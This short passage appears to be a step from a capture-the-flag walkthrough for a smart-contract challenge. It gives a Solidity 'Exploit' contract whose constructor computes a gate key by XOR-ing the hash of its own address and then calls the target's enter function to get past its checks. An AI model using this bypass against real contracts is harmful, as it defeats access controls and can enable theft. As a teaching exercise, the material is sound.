Deploy the following contract to the same network, sending your contract instance
```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.6.4;

contract Exploit {
    constructor (address _who) public {
        bytes8 key = (bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(uint64(0) - 1));

        (bool s,) = _who.call(abi.encodeWithSignature("enter(bytes8)", key));
        require(s);
    }
}
```
